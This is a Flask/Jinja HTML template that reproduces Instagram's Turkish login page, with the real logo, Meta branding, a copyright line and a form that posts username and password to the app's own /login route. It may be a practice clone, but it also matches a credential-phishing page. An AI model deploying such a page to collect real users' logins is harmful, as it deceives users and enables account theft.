<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}" />
    <link rel="icon" type="image/png" href="{{ url_for('static', filename='img/insta-fav.ico') }}">
    <title>Instagram clone</title>
</head> 
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="{{ url_for('static', filename='img/instagram-logo.png') }}?v=1" alt="Instagram logo" />
                </h1>

                <form action="/login" method="POST">
                    <div class="mb-4">
                        <label for="username" class="sr-only">Username</label>
                        <input type="text" name="username" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                    </div>
                    <div class="mb-4">
                        <label for="password" class="sr-only">Password</label>
                        <input type="password" name="password" id="password" placeholder="Şifre" required>
                    </div>
                    <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded-md">Login</button>
                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">YA DA</div>
                    <span></span>
                  </div>                  
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img src="{{ url_for('static', filename='img/facebook-icon.png') }}" alt="Facebook Icon" />
                        <a>Facebook ile Giriş Yap</a>
                    </div>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Hesabın yok mu?</p>
                <a href="#">K</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Uygulamayı indir.</p>
                <div class="flex justify-content-center">
                    <img src="{{ url_for('static', filename='img/apple-button.png') }}" alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="{{ url_for('static', filename='img/googleplay-button.png') }}" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">Meta</a></li>
            <li><a href="#">Hakkında</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">İş Fırsatları</a></li>
            <li><a href="#">Yardım</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Gizlilik</a></li>
            <li><a href="#">Koşullar</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a></li>
            <li><a href="#">Meta Verified</a></li>
        </ul>
        <p class="copyright">&copy; © 2025 Instagram from Meta</p>
    </footer>
</body>
</html>
